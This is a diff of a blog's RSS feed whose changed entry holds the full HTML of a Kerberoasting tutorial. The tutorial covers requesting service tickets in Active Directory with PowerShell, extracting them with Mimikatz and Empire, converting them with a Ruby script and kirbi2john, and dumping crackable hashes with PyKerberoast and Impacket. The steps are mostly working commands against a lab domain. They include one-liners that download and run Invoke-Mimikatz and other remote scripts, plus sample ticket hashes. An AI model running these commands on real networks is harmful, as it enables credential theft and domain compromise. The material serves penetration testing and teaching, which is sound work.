@@ -16,52 +16,28 @@
       <pubDate>Sat, 21 May 2016 07:35:28 -0500</pubDate>
       
       <guid>https://malicious.link/post/2016/kerberoast-pt2/</guid>
-      <description>
-
-&lt;p&gt;&lt;strong&gt;Previous works:&lt;/strong&gt; There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&amp;rsquo;ll will be sure to reference it.&lt;/p&gt;
-
+      <description>&lt;p&gt;&lt;strong&gt;Previous works:&lt;/strong&gt; There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&#39;ll will be sure to reference it.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Attacker KB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;
-
 &lt;p&gt;&lt;strong&gt;Common Findings DB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;
-
-&lt;p&gt;Now that we&amp;rsquo;ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them.&lt;/p&gt;
-
+&lt;p&gt;Now that we&#39;ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them.&lt;/p&gt;
 &lt;h2 id=&#34;requesting-spn-kerberos-tickets&#34;&gt;Requesting SPN Kerberos Tickets&lt;/h2&gt;
-
 &lt;h3 id=&#34;powershell-requesting&#34;&gt;PowerShell Requesting&lt;/h3&gt;
-
-&lt;p&gt;These are stolen directly from &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/README.md&#34;&gt;Kerberoast repository README.md&lt;/a&gt;&lt;/p&gt;
-
+&lt;p&gt;These are stolen directly from &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin @timmedin&lt;/a&gt;&amp;lsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/README.md&#34;&gt;Kerberoast repository README.md&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;One specific ticket:&lt;/strong&gt;&lt;/p&gt;
-
 &lt;p&gt;This is great if you are targeting one specific user account:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel  
 PS C:\&amp;gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &amp;quot;HTTP/web01.medin.local&amp;quot;  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;All the tickets (including Computer account tickets):&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;I&amp;rsquo;m not a huge fan of this method since you get too many tickets to deal with but it&amp;rsquo;s a great example of how to use PowerShell to parse and request things like this:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;All the tickets (including Computer account tickets):&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;I&#39;m not a huge fan of this method since you get too many tickets to deal with but it&#39;s a great example of how to use PowerShell to parse and request things like this:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel  
 PS C:\&amp;gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;powershell-requesting-just-users&#34;&gt;PowerShell Requesting - Just Users&lt;/h3&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;powershell-requesting---just-users&#34;&gt;PowerShell Requesting - Just Users&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;Getting just the User tickets:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;This is a slightly modified version of Tim&amp;rsquo;s script from above. It pulls down his GetUserSPNs powershell script instead of using &lt;code&gt;SetSPN.exe&lt;/code&gt; and makes a request for each of the resulting SPN tickets.&lt;/p&gt;
-
+&lt;p&gt;This is a slightly modified version of Tim&#39;s script from above. It pulls down his GetUserSPNs powershell script instead of using &lt;code&gt;SetSPN.exe&lt;/code&gt; and makes a request for each of the resulting SPN tickets.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
 PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&amp;quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;empire&#34;&gt;Empire&lt;/h3&gt;
-
-&lt;p&gt;PowerShell Empire received the functionality to get the SPN Tickets via &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt;&amp;rsquo;s commit here: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639&#34;&gt;b977dec&lt;/a&gt; which as of the writing of this post was still in the &lt;code&gt;dev&lt;/code&gt; branch of Empire (not master yet)&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;empire&#34;&gt;Empire&lt;/h3&gt;
+&lt;p&gt;PowerShell Empire received the functionality to get the SPN Tickets via &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt;&amp;lsquo;s commit here: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639&#34;&gt;b977dec&lt;/a&gt; which as of the writing of this post was still in the &lt;code&gt;dev&lt;/code&gt; branch of Empire (not master yet)&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;(Empire: BDW3E2G2ZRKCUS3B) &amp;gt; usemodule credentials/get_spn_tickets
 (Empire: credentials/get_spn_tickets) &amp;gt; info
 
@@ -117,26 +93,15 @@ ServicePrincipalName : MSSQLSvc/WIN2K8R2.sittingduck.info
 SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
 
 Get-SPNTickets completed!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;exporting-the-tickets&#34;&gt;Exporting the tickets&lt;/h2&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;exporting-the-tickets&#34;&gt;Exporting the tickets&lt;/h2&gt;
 &lt;p&gt;Now we need to get the tickets out of the system we just requested them to. We can do this with Mimikatz both by itself, or directly in Empire:&lt;/p&gt;
-
 &lt;h3 id=&#34;mimikatz&#34;&gt;Mimikatz&lt;/h3&gt;
-
 &lt;p&gt;Using the &lt;strong&gt;&lt;code&gt;kerberos::list /export&lt;/code&gt;&lt;/strong&gt; functionality is awesome, but this will generate a file per-ticket. I have been on a few engagements where that meant 4000+ files. Luckily the awesome &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; saves us and has included a &amp;ldquo;base64&amp;rdquo; mode for Mimikatz&lt;/p&gt;
-
-&lt;p&gt;So here I&amp;rsquo;m simply pulling the &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; script that &lt;a href=&#34;https://twitter.com/JosephBialek&#34;&gt;@JosephBialek&lt;/a&gt; &amp;ldquo;clymb3r&amp;rdquo; created, into memory, telling Mimikatz to go in &amp;ldquo;base64&amp;rdquo; mode, export all of the active tickets and exit.&lt;/p&gt;
-
+&lt;p&gt;So here I&#39;m simply pulling the &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; script that &lt;a href=&#34;https://twitter.com/JosephBialek&#34;&gt;@JosephBialek&lt;/a&gt; &amp;ldquo;clymb3r&amp;rdquo; created, into memory, telling Mimikatz to go in &amp;ldquo;base64&amp;rdquo; mode, export all of the active tickets and exit.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;quot;)
 PS C:\&amp;gt; Invoke-Mimikatz -Command &#39;standard::base64 &amp;quot;kerberos::list /export&amp;quot; exit&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;empire-1&#34;&gt;Empire&lt;/h3&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;empire-1&#34;&gt;Empire&lt;/h3&gt;
 &lt;p&gt;Here is the module:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;(Empire: agents) &amp;gt; usemodule credentials/mimikatz/extract_tickets
 (Empire: credentials/mimikatz/extract_tickets) &amp;gt; info
 
@@ -161,10 +126,7 @@ Options:
   Name  Required    Value                     Description
   ----  --------    -------                   -----------
   Agent True        None                      Agent to run module on.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And the result&amp;hellip;&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the result&amp;hellip;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Job started: Debug32_segox
 Hostname: win7.sittingduck.info / S-1-5-21-4217918325-2978756054-1117708521
   .#####.   mimikatz 2.1 (x64) built on Mar 31 2016 16:45:32
@@ -203,52 +165,45 @@ GxBTSVRUSU5HRFVDSy5JTkZP
 ====================
 
    * Saved to file     : 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
-&lt;/code&gt;&lt;/pre&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&#39;ve cut the result down quite a bit as it would scroll for a bit in this format.&lt;/p&gt;
+&lt;p&gt;Now the problem is that they are all text and for you to crack things or at least convert them into a format that JtR or oclHastcat can digest they need to be in binary format. So I made this script to convert and &lt;code&gt;agent.log&lt;/code&gt; file from the output of &lt;strong&gt;&lt;code&gt;extract_tickets&lt;/code&gt;&lt;/strong&gt; back into their binary format with correct file names. My coding isn&#39;t great, so please let me know how I can improve this script:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+require &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;
 
-&lt;p&gt;I&amp;rsquo;ve cut the result down quite a bit as it would scroll for a bit in this format.&lt;/p&gt;
+puts &lt;span style=&#34;color:#66d9ef&#34;&gt;ARGV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inspect
 
-&lt;p&gt;Now the problem is that they are all text and for you to crack things or at least convert them into a format that JtR or oclHastcat can digest they need to be in binary format. So I made this script to convert and &lt;code&gt;agent.log&lt;/code&gt; file from the output of &lt;strong&gt;&lt;code&gt;extract_tickets&lt;/code&gt;&lt;/strong&gt; back into their binary format with correct file names. My coding isn&amp;rsquo;t great, so please let me know how I can improve this script:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;#!/usr/bin/env ruby
-require &#39;base64&#39;
-
-puts ARGV.inspect
-
-if ARGV.length != 1
-	puts &amp;quot;Requires a file to parse, usually agent.log&amp;quot;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ARGV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;length &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+	&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Requires a file to parse, usually agent.log&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 	exit
-end
+&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
 
-border = &amp;quot;====================&amp;quot;
-bordercount = 0
-ticket = []
-filename = &amp;quot;failed.log&amp;quot;
+border &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;====================&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+bordercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;ticket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;failed.log&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 
-File.open(ARGV[0]).each do |line|
-	if line.strip == border
-		case bordercount
-		when 2
-			File.open(filename, &#39;a&#39;) {|f| f.write(Base64.decode64(ticket.join))}
-			bordercount = 0
-			ticket = []
-			filename = &amp;quot;failed.log&amp;quot;
-		else
-			bordercount = bordercount + 1
-		end
-	else
-		case bordercount
-		when 1
-			filename = line.strip.split(&amp;quot; : &amp;quot;)[1]
-			puts &amp;quot;Storing #{filename}&amp;quot;
-		when 2
-			ticket &amp;lt;&amp;lt; line.strip
-		end
-	end
-end
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Save that and just feed it an &lt;code&gt;agent.log&lt;/code&gt; file from Empire and WA-LA! you have kirbi files.&lt;/p&gt;
-
+&lt;span style=&#34;color:#66d9ef&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(&lt;span style=&#34;color:#66d9ef&#34;&gt;ARGV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;line&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; border
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; bordercount
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(filename, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;) {&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#66d9ef&#34;&gt;Base64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode64(ticket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join))}
+			bordercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;ticket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+			filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;failed.log&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+			bordercount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bordercount &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; bordercount
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;filename &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; : &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+			puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Storing &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;filename&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;ticket &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Save that and just feed it an &lt;code&gt;agent.log&lt;/code&gt; file from Empire and WA-LA! you have kirbi files.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;ruby parse.rb agent.log
 [&amp;quot;agent.log&amp;quot;]
 Storing 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
@@ -262,61 +217,39 @@ Storing 7-40a50000-notanadmin@cifs~win2k8r2.sittingduck.info-SITTINGDUCK.INFO.ki
 Storing 8-40a50000-notanadmin@ldap~win2k8r2.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi
 Storing 9-40a50000-notanadmin@ldap~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi
 Storing 10-40a50000-notanadmin@LDAP~DC1.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Next we need to convert those binary tickets into something crackable. That is where &lt;strong&gt;&lt;code&gt;kirbi2john.py&lt;/code&gt;&lt;/strong&gt; comes in.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next we need to convert those binary tickets into something crackable. That is where &lt;strong&gt;&lt;code&gt;kirbi2john.py&lt;/code&gt;&lt;/strong&gt; comes in.&lt;/p&gt;
 &lt;h3 id=&#34;kirbi2john&#34;&gt;Kirbi2John&lt;/h3&gt;
-
 &lt;p&gt;There are two versions of &amp;ldquo;kirbi2john&amp;rdquo;.&lt;/p&gt;
-
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/kirbi2john.py&#34;&gt;Kerberoast version of kirbi2john.py by Michael Kramer (SySS GmbH)&lt;/a&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py&#34;&gt;John the Ripper&amp;rsquo;s version of kirbi2john.py by Michael Kramer - modded by Dhiru Kholia&lt;/a&gt;&lt;/p&gt;
-
+&lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py&#34;&gt;John the Ripper&#39;s version of kirbi2john.py by Michael Kramer - modded by Dhiru Kholia&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;pre&gt;&lt;code&gt;root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi
 $krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54f7c71a700397fa53dbe5ee86ee2e30e89586c8d447f6df8489fc1b53241cf87777712d5b1a0ebf066df08b12138a52b40aab0c25c00fd1db222f06e10277771315f3be538728a140abe9f2780761197c51f3d70fe630b898539bc3aa0d688ad848110d85fd55db5692d269e45a154410784f430084c2aa1190f95cda4d13a5463418c94d016af7ff36adf2f49b80e42d73a75b12f2ea210bf663e0fdeb42e0ff0b416bbf5056cd7f87a7c122fddec81daba5d5eb390073e76fff48139281cef9c8b88af4229689ad018b432d4ecb2c4d673810bef6096507caeb9cfe963a0201cea0bdd4a58b93c72ab238dd69c48b72a189dfcac541052156659c1d1ab3ce7ee2882b93b11ba5b14679105de476e3953d5ceb7328a5d221cfd323b7deb8234be1bf0d4b8c9f02463ad6da667323478f7acba2424e4311c837db608fc27b25a24d6c1315d7927d165a0859460ed65aaabaffd488b23dfcb01c8866aad556831370e89c25a6d8843aae676186f927eadf86f187d355f4a1d97472a44dc32fc52c4b6c40f42bb84f8589ee607eff2fd511bb6eaae90640a6dd2b3557ae5ae992d025aa13c25fafe9bd5b93aa36834a715c5dcde96bda38b880797852d2cff13324a1751a9b198b60ebf81c96b8dc5edf1474fe1fa53628f3aa53416e4062c503f1efb22a8ce11ab7ba8c40bc30c816568091ad051c55b3c8780964c87b5db241224bd3280eecb7e73f2921c770ccf41fbea8e43b2a1be0c6178c799fdbe8d1fffdd4a37a2aeeebb27a4f09f669203969b80e1ab7d6e28cae00af7fd3a6c731448c97356759ecc3eefec7f6ef155bd63b84bb25b1b66f8f1908ece15dbba12219c80b6797e04315889790f9c06c611314f8cd
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;But all of that is hard and creates evidence. Lets look back at the tools &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; and &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&amp;rsquo;s GetUserSPNs.py&lt;/a&gt; and see if there is a better way:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But all of that is hard and creates evidence. Lets look back at the tools &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; and &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&#39;s GetUserSPNs.py&lt;/a&gt; and see if there is a better way:&lt;/p&gt;
 &lt;h2 id=&#34;pykerberoast&#34;&gt;PyKerberoast&lt;/h2&gt;
-
 &lt;ul&gt;
 &lt;li&gt;Source: &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;https://github.com/skelsec/PyKerberoast&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Requirements: &lt;code&gt;python-ldap&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;p&gt;This awesome work by &lt;a href=&#34;https://twitter.com/skelsec&#34;&gt;@skelsec&lt;/a&gt; makes it so no new Kerberos tickets need to be added to the client, no use of Mimikatz, and no need to parse anything, it just contacts the Domain Controller. It pulls out all of the information needed for the SPNs, requests the tickets and outputs them in John the Ripper format.&lt;/p&gt;
-
 &lt;p&gt;Usage:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME
                 [-p PASSWORD] [-o OUTPUTFILE] [-em ENUMMACHINE] [-v]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Example (I have snipped up some of the output to save space):&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Example (I have snipped up some of the output to save space):&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; -d sittingduck -u notanadmin
 [+]Starting...
 Password:
 $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af52b31c7c39808f02bceb2d728550e375ff7321f7383f4800445df2a27006950a0f88c69a447de1643a7418f056315c684382068701a62f627c6cafde81bbc657c865ddd828027cef1edc11228ea0b95caca91647fc4b581efb380e466d12e253309d65a11dcbe02b0de70e0aa9044350461ad5d4293a07e3cf588a05a04a7942b63f395c6eed5e8dc826160a7bc00e295df539e419b9a4c17762b3bc987bc339354892e51090d7a7ede236cf500438e57f47a4155cc38f8a07cfdb2e3f7033ce412a6f7856911d9cf95e659daf4269d1b31cf872b09dc86af614b95c457fc896d01fdfb0afc751d2279d4c715
 
 [+]Done!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;impacket&#34;&gt;Impacket&lt;/h2&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;impacket&#34;&gt;Impacket&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;Original Discussion: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868&#34;&gt;https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Added May 13 2016: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/commit/2a185c1ecc0b0a56467f12dfccbd5672ed95adaa&#34;&gt;https://github.com/CoreSecurity/impacket/commit/2a185c1ecc0b0a56467f12dfccbd5672ed95adaa&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Source: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;p&gt;Just by adding a &lt;strong&gt;&lt;code&gt;-request&lt;/code&gt;&lt;/strong&gt; to our previous run we can request all of the user SPN tickets and they are output in John the Ripper format (I&amp;rsquo;ve snipped up some of the output to save space):&lt;/p&gt;
-
+&lt;p&gt;Just by adding a &lt;strong&gt;&lt;code&gt;-request&lt;/code&gt;&lt;/strong&gt; to our previous run we can request all of the user SPN tickets and they are output in John the Ripper format (I&#39;ve snipped up some of the output to save space):&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin
 Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies
 
@@ -328,14 +261,9 @@ MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                  
 
